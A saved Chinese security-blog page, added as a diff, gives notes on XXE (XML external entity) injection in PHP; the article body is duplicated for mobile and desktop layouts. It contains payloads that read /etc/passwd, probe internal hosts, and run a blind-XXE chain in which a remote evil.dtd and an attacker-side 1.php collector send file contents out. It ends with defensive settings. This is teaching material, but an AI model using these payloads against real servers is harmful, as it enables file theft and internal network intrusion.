@@ -1,0 +1,426 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./XXE-Injection笔记/font-awesome.min.css" rel="stylesheet"/>
+<link href="./XXE-Injection笔记/screen.css" rel="stylesheet"/>
+<link href="./XXE-Injection笔记/prism_okaidia.css" rel="stylesheet"/>
+<link href="./XXE-Injection笔记/bendawang.css" rel="stylesheet"/>
+<script src="./XXE-Injection笔记/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./XXE-Injection笔记/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./XXE-Injection笔记/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="xxeinjection">XXE Injection</h1>
+<h2 id="xmlentity">XML ENTITY</h2>
+<p style="max-width:100%;height:auto;">XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击。
+DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!DOCTYPE 根元素 [元素声明]&gt;
+&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">DTD实体ENTITY，一般分为参数实体和内部实体；参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀；内部实体是指用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用；</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!ENTITY 实体名称 "实体的值"&gt;
+&lt;!ENTITY 实体名称 SYSTEM "URI"&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">所以在XML中实体的用法如下：</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">ENTITY的定义语法：
+&lt;!DOCTYPE  文件名 [
+&lt;!ENTITY  实体名 "实体内容"&gt;
+]&gt;
+//这一坨就是DTD了
+</code></pre>
+<p style="max-width:100%;height:auto;">定义好的ENTITY在文档中通过“&amp;实体名;”来使用。
+类似于宏定义的一种东西。
+造成XXE的原因主要是php中的一个函数。
+php中有<code style="max-width:100%;height:auto;">xml_parse</code>和<code style="max-width:100%;height:auto;">simplexml_load_*</code>，用于处理XML，而<code style="max-width:100%;height:auto;">simplexml_load</code>默认情况下会解析外部实体，这也就是问题的关键。（php5.5.12和5.6以上都不会自动解析，php5.4.4可以）</p>
+<h2 id="xxeinjection-1">XXE Injection</h2>
+<p style="max-width:100%;height:auto;">首先一个简单的例子：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$a=&lt;&lt;&lt;XML
+
+&lt;!DOCTYPE ANY [
+        &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+XML;
+$data=simplexml_load_string($a);
+print_r($data);
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">这里就通过了<code style="max-width:100%;height:auto;">ENTITY</code>引入了外部实体，得到这样的结果：</p>
+<p style="max-width:100%;height:auto;">这里通过<code style="max-width:100%;height:auto;">file://</code> 协议引入了外部实体
+还有一些可用的其他协议</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">file:///path/to/file.ext
+http://url/file.ext
+php://filter/read=convert.base64-encode/resource=conf.php
+</code></pre>
+<p style="max-width:100%;height:auto;">还有很多思路：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$a=&lt;&lt;&lt;XML
+
+&lt;!DOCTYPE ANY [
+        &lt;!ENTITY xxe SYSTEM "http://192.168.96.1"&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+XML;
+$data=simplexml_load_string($a);
+print_r($data);
+</code></pre>
+<p style="max-width:100%;height:auto;">通过上面可以用来内网探测，如果安装了expect扩展组件甚至可以用来进行内网渗透。</p>
+<p style="max-width:100%;height:auto;">还有如下用法：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./XXE-Injection笔记/586db16255e6ec752900007c.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">内部实体的这支持与否也是取决于解释器的。不同的浏览器不一样，不通语言默认也不一样。所以利用比较困难。
+但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。</p>
+<h2 id="blindxxe">Blind XXE</h2>
+<p style="max-width:100%;height:auto;">服务器上：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$xml=&lt;&lt;&lt;EOF
+
+&lt;!DOCTYPE ANY[
+&lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;
+&lt;!ENTITY % remote SYSTEM "http://192.168.161.1/xxe/evil.dtd"&gt;
+%remote;
+%send;
+]&gt;
+EOF;
+$data = simplexml_load_string($xml) ;
+echo "&lt;pre&gt;" ;
+print_r($data) ;
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">自己的机器上
+[1.php]</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php  
+file_put_contents("1.txt", $_GET[&amp;apos;file&amp;apos;]) ;  
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">[evil.dtd]</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!ENTITY % all
+"&lt;!ENTITY &amp;#x25; send SYSTEM &amp;apos;http://192.168.161.1/xxe/1.php?file=%file;&amp;apos;&gt;"
+&gt;
+%all;
+</code></pre>
+<h2 id="">防御</h2>
+<p style="max-width:100%;height:auto;">1、例如php可以提前加上：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php libxml_disable_entity_loader(true); ?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">2、检查所使用的底层xml解析库，默认禁止外部实体的解析
+3、对于XMLReader和DOM方式解析</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php 
+// with the XMLReader functionality: 
+$doc = XMLReader::xml($badXml,&amp;apos;UTF-8&amp;apos;,LIBXML_NONET); 
+ // with the DOM functionality: 
+$dom = new DOMDocument(); 
+$dom-&gt;loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR); 
+?&gt;
+</code></pre>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./XXE-Injection笔记/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="xxeinjection">XXE Injection</h1>
+<h2 id="xmlentity">XML ENTITY</h2>
+<p style="max-width:100%;height:auto;">XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击。
+DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!DOCTYPE 根元素 [元素声明]&gt;
+&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">DTD实体ENTITY，一般分为参数实体和内部实体；参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀；内部实体是指用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用；</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!ENTITY 实体名称 "实体的值"&gt;
+&lt;!ENTITY 实体名称 SYSTEM "URI"&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">所以在XML中实体的用法如下：</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">ENTITY的定义语法：
+&lt;!DOCTYPE  文件名 [
+&lt;!ENTITY  实体名 "实体内容"&gt;
+]&gt;
+//这一坨就是DTD了
+</code></pre>
+<p style="max-width:100%;height:auto;">定义好的ENTITY在文档中通过“&amp;实体名;”来使用。
+类似于宏定义的一种东西。
+造成XXE的原因主要是php中的一个函数。
+php中有<code style="max-width:100%;height:auto;">xml_parse</code>和<code style="max-width:100%;height:auto;">simplexml_load_*</code>，用于处理XML，而<code style="max-width:100%;height:auto;">simplexml_load</code>默认情况下会解析外部实体，这也就是问题的关键。（php5.5.12和5.6以上都不会自动解析，php5.4.4可以）</p>
+<h2 id="xxeinjection-1">XXE Injection</h2>
+<p style="max-width:100%;height:auto;">首先一个简单的例子：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$a=&lt;&lt;&lt;XML
+
+&lt;!DOCTYPE ANY [
+        &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+XML;
+$data=simplexml_load_string($a);
+print_r($data);
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">这里就通过了<code style="max-width:100%;height:auto;">ENTITY</code>引入了外部实体，得到这样的结果：</p>
+<p style="max-width:100%;height:auto;">这里通过<code style="max-width:100%;height:auto;">file://</code> 协议引入了外部实体
+还有一些可用的其他协议</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">file:///path/to/file.ext
+http://url/file.ext
+php://filter/read=convert.base64-encode/resource=conf.php
+</code></pre>
+<p style="max-width:100%;height:auto;">还有很多思路：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$a=&lt;&lt;&lt;XML
+
+&lt;!DOCTYPE ANY [
+        &lt;!ENTITY xxe SYSTEM "http://192.168.96.1"&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+XML;
+$data=simplexml_load_string($a);
+print_r($data);
+</code></pre>
+<p style="max-width:100%;height:auto;">通过上面可以用来内网探测，如果安装了expect扩展组件甚至可以用来进行内网渗透。</p>
+<p style="max-width:100%;height:auto;">还有如下用法：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./XXE-Injection笔记/586db16255e6ec752900007c.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">内部实体的这支持与否也是取决于解释器的。不同的浏览器不一样，不通语言默认也不一样。所以利用比较困难。
+但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。</p>
+<h2 id="blindxxe">Blind XXE</h2>
+<p style="max-width:100%;height:auto;">服务器上：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$xml=&lt;&lt;&lt;EOF
+
+&lt;!DOCTYPE ANY[
+&lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;
+&lt;!ENTITY % remote SYSTEM "http://192.168.161.1/xxe/evil.dtd"&gt;
+%remote;
+%send;
+]&gt;
+EOF;
+$data = simplexml_load_string($xml) ;
+echo "&lt;pre&gt;" ;
+print_r($data) ;
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">自己的机器上
+[1.php]</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php  
+file_put_contents("1.txt", $_GET[&amp;apos;file&amp;apos;]) ;  
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">[evil.dtd]</p>
+<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!ENTITY % all
+"&lt;!ENTITY &amp;#x25; send SYSTEM &amp;apos;http://192.168.161.1/xxe/1.php?file=%file;&amp;apos;&gt;"
+&gt;
+%all;
+</code></pre>
+<h2 id="">防御</h2>
+<p style="max-width:100%;height:auto;">1、例如php可以提前加上：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php libxml_disable_entity_loader(true); ?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">2、检查所使用的底层xml解析库，默认禁止外部实体的解析
+3、对于XMLReader和DOM方式解析</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php 
+// with the XMLReader functionality: 
+$doc = XMLReader::xml($badXml,&amp;apos;UTF-8&amp;apos;,LIBXML_NONET); 
+ // with the DOM functionality: 
+$dom = new DOMDocument(); 
+$dom-&gt;loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR); 
+?&gt;
+</code></pre>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./XXE-Injection笔记/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./XXE-Injection笔记/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./XXE-Injection笔记/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./XXE-Injection笔记/prism.js"></script>
+<script src="./XXE-Injection笔记/zooming.js"></script>
+<script src="./XXE-Injection笔记/Bendawang.js"></script>
+
+
